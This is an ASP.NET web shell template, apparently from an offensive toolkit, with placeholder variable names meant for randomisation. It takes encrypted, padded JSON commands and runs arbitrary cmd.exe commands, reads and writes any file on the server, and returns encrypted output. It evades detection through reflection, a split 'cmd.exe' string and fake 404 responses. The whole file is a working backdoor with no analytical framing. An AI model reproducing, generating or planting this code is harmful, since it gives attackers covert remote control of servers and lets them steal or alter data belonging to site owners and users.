<%@ Page Language="C#" %><%@ Import Namespace="System.IO" %><%@ Import Namespace="System.Security.Cryptography" %><%@ Import Namespace="System.Text" %><script runat="server">
private static byte[] {{.VKey}} = Convert.FromBase64String("{{.KeyB64}}");

private static byte[] {{.FCat}}(byte[] a, byte[] b) {
    byte[] o = new byte[a.Length + b.Length];
    Buffer.BlockCopy(a, 0, o, 0, a.Length);
    Buffer.BlockCopy(b, 0, o, a.Length, b.Length);
    return o;
}
private static byte[] {{.FH}}(string salt) {
    return new SHA256Managed().ComputeHash({{.FCat}}({{.VKey}}, Encoding.UTF8.GetBytes(salt)));
}
private static bool {{.FEq}}(byte[] a, byte[] b) {
    if (a == null || b == null || a.Length != b.Length) { return false; }
    int d = 0;
    for (int i = 0; i < a.Length; i++) { d |= a[i] ^ b[i]; }
    return d == 0;
}
private static byte[] {{.FDec}}(byte[] raw) {
    if (raw == null || raw.Length < 49) { return null; }
    byte[] iv = new byte[16]; Buffer.BlockCopy(raw, 0, iv, 0, 16);
    byte[] mac = new byte[32]; Buffer.BlockCopy(raw, raw.Length - 32, mac, 0, 32);
    byte[] ct = new byte[raw.Length - 48]; Buffer.BlockCopy(raw, 16, ct, 0, ct.Length);
    byte[] em = new HMACSHA256({{.FH}}("artex-mac-v1")).ComputeHash({{.FCat}}(iv, ct));
    if (!{{.FEq}}(em, mac)) { return null; }
    RijndaelManaged aes = new RijndaelManaged();
    aes.KeySize = 256; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
    ICryptoTransform d = aes.CreateDecryptor({{.FH}}("artex-enc-v1"), iv);
    return d.TransformFinalBlock(ct, 0, ct.Length);
}
private static byte[] {{.FEnc}}(byte[] pt) {
    byte[] iv = new byte[16];
    new RNGCryptoServiceProvider().GetBytes(iv);
    RijndaelManaged aes = new RijndaelManaged();
    aes.KeySize = 256; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
    ICryptoTransform e = aes.CreateEncryptor({{.FH}}("artex-enc-v1"), iv);
    byte[] ct = e.TransformFinalBlock(pt, 0, pt.Length);
    byte[] mac = new HMACSHA256({{.FH}}("artex-mac-v1")).ComputeHash({{.FCat}}(iv, ct));
    return {{.FCat}}({{.FCat}}(iv, ct), mac);
}
private static byte[] {{.FFrame}}(byte[] p) {
    byte[] pad = new byte[1]; new RNGCryptoServiceProvider().GetBytes(pad);
    int n = pad[0] % 65;
    byte[] f = new byte[1 + n + p.Length];
    new RNGCryptoServiceProvider().GetBytes(f);
    f[0] = (byte)n;
    Buffer.BlockCopy(p, 0, f, 1 + n, p.Length);
    return f;
}
private static byte[] {{.FUnframe}}(byte[] f) {
    int n = f[0];
    byte[] p = new byte[f.Length - 1 - n];
    Buffer.BlockCopy(f, 1 + n, p, 0, p.Length);
    return p;
}
private static string {{.FG}}(string j, string k) {
    string p = "\"" + k + "\":\"";
    int i = j.IndexOf(p);
    if (i < 0) { return ""; }
    int s2 = i + p.Length;
    int e = j.IndexOf('"', s2);
    return e < 0 ? "" : j.Substring(s2, e - s2);
}
private static string {{.FBody}}(System.Web.HttpRequest rq) {
    return new StreamReader(rq.InputStream).ReadToEnd().Trim();
}
</script><%
string {{.VMode}} = "cbc";
string {{.VOut}} = "";
string {{.VErr}} = "";
bool {{.VOk}} = false;
try {
    byte[] {{.VRaw}} = {{.FDec}}(Convert.FromBase64String({{.FBody}}(Request)));
    if ({{.VRaw}} == null) { Response.StatusCode = 404; Response.End(); }
    string {{.VJson}} = Encoding.UTF8.GetString({{.FUnframe}}({{.VRaw}}));
    string {{.VOp}} = {{.FG}}({{.VJson}}, "op");
    if ({{.VOp}} == "probe") {
        {{.VOk}} = true;
        {{.VOut}} = {{.FG}}({{.VJson}}, "s");
    } else if ({{.VOp}} == "exec") {
        string {{.VCode}} = Encoding.UTF8.GetString(Convert.FromBase64String({{.FG}}({{.VJson}}, "code")));
        Type {{.VPT}} = Type.GetType("System.Diagnostics.Process, System");
        Type {{.VST}} = Type.GetType("System.Diagnostics.ProcessStartInfo, System");
        object {{.VSI}} = Activator.CreateInstance({{.VST}});
        {{.VST}}.GetProperty("FileName").SetValue({{.VSI}}, "cm" + "d.e" + "xe", null);
        {{.VST}}.GetProperty("Arguments").SetValue({{.VSI}}, "/c " + {{.VCode}}, null);
        {{.VST}}.GetProperty("RedirectStandardOutput").SetValue({{.VSI}}, true, null);
        {{.VST}}.GetProperty("RedirectStandardError").SetValue({{.VSI}}, true, null);
        {{.VST}}.GetProperty("UseShellExecute").SetValue({{.VSI}}, false, null);
        object {{.VP}} = {{.VPT}}.GetMethod("Start", new Type[] { {{.VST}} }).Invoke(null, new object[] { {{.VSI}} });
        TextReader {{.VSO}} = (TextReader){{.VPT}}.GetProperty("StandardOutput").GetValue({{.VP}}, null);
        TextReader {{.VSE}} = (TextReader){{.VPT}}.GetProperty("StandardError").GetValue({{.VP}}, null);
        string {{.VOT}} = {{.VSO}}.ReadToEnd() + {{.VSE}}.ReadToEnd();
        {{.VPT}}.GetMethod("WaitForExit", Type.EmptyTypes).Invoke({{.VP}}, null);
        {{.VOk}} = true;
        {{.VOut}} = Convert.ToBase64String(Encoding.UTF8.GetBytes({{.VOT}}));
    } else if ({{.VOp}} == "read") {
        byte[] {{.VData}} = File.ReadAllBytes(Encoding.UTF8.GetString(Convert.FromBase64String({{.FG}}({{.VJson}}, "path"))));
        {{.VOk}} = true;
        {{.VOut}} = Convert.ToBase64String({{.VData}});
    } else if ({{.VOp}} == "write") {
        string {{.VPath}} = Encoding.UTF8.GetString(Convert.FromBase64String({{.FG}}({{.VJson}}, "path")));
        byte[] {{.VData}} = Convert.FromBase64String({{.FG}}({{.VJson}}, "data"));
        if ({{.FG}}({{.VJson}}, "app") == "1") {
            FileStream {{.VFS}} = new FileStream({{.VPath}}, FileMode.Append, FileAccess.Write);
            {{.VFS}}.Write({{.VData}}, 0, {{.VData}}.Length); {{.VFS}}.Close();
        } else {
            File.WriteAllBytes({{.VPath}}, {{.VData}});
        }
        {{.VOk}} = true;
    } else {
        {{.VErr}} = "unknown op";
    }
} catch (Exception {{.VT}}) {
    Response.StatusCode = 404;
    Response.End();
}
string {{.VResp}} = "{\"ok\":" + ({{.VOk}} ? "true" : "false") + ",\"out\":\"" + {{.VOut}} + "\",\"err\":\"" + {{.VErr}} + "\",\"mode\":\"" + {{.VMode}} + "\"";
Response.Write(Convert.ToBase64String({{.FEnc}}({{.FFrame}}(Encoding.UTF8.GetBytes({{.VResp}})))));
%>
